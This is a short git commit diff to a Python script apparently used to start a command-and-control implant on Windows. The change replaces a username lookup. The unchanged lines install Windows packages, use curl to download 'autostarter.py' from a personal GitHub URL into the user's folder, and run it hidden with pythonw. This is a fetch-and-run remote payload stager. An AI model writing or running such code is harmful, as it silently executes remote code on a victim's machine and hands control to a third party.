2ca9afb930ac9b08e27edb0e27a62a809e15e4a7
jkramer5103 <121427510+jkramer5103@users.noreply.github.com>
2024-10-15 19:10:16 +0200

    Update ComAndConStarter.py

--- ComAndConStarter.py
+++ ComAndConStarter.py
@@ -12,8 +12,6 @@ os.system("pip install hashlib")
 os.system("pip install winshell")
 os.system("pip install pywin32")
 
-whoami = os.system("whoami")
-whoami_split = whoami.split("\\")
-username = whoami_split[1]
+username = os.getlogin()
 os.system(f"cd C:\\Users\\{username} && curl -O https://raw.githubusercontent.com/jkramer5103/stuff/refs/heads/main/autostarter.py")
 os.system(f"pythonw autostarter.py {argument}")
